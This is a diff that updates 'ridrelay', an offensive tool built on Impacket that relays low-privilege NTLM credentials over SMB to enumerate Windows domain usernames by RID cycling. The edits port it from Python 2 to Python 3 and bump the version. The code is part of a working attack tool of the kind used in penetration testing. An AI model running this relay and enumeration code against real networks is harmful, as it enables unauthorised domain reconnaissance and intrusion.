@@ -1,4 +1,3 @@
-from __future__ import print_function
 import argparse
 import logging
 import sys
@@ -17,11 +16,6 @@ from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.smbconnection import SMBConnection
-
-try:
-    xrange          # Python 2
-except NameError:
-    xrange = range  # Python 3
 
 getting_usernames = False
 got_usernames = False
@@ -50,7 +44,7 @@ class SMBAttack(Thread):
         dce.connect()
 
         dce.bind(lsat.MSRPC_UUID_LSAT)
-        resp = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
+        resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
         policyHandle = resp['PolicyHandle']
 
         # Get Domain Sid if we are in a domain
@@ -77,7 +71,7 @@ class SMBAttack(Thread):
 
         soFar = 0
         SIMULTANEOUS = 1000
-        for j in range(maxRid / SIMULTANEOUS + 1):
+        for j in range(int(maxRid / SIMULTANEOUS + 1)):
             if (maxRid - soFar) / SIMULTANEOUS == 0:
                 sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
             else:
@@ -87,7 +81,7 @@ class SMBAttack(Thread):
                 break
 
             sids = list()
-            for i in xrange(soFar, soFar + sidsToCheck):
+            for i in range(soFar, soFar + sidsToCheck):
                 sids.append(domainSid + '-%d' % i)
             try:
                 lsat.hLsarLookupSids(dce, policyHandle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
@@ -310,7 +304,7 @@ class SAMRDump:
 
         t2bin = tbin[::-1]
         if len(t2bin) != 8:
-            for x in xrange(6 - len(t2bin)):
+            for x in range(6 - len(t2bin)):
                 t2bin.insert(0, 0)
         return ''.join([str(g) for g in t2bin])
 
@@ -326,7 +320,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     logger.init()
-    print('ridrelay v0.2 - Get domain usernames by relaying low priv creds!\n')
+    print('ridrelay v1.0 - Get domain usernames by relaying low priv creds!\n')
 
     logging.getLogger().setLevel(logging.INFO)
     logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
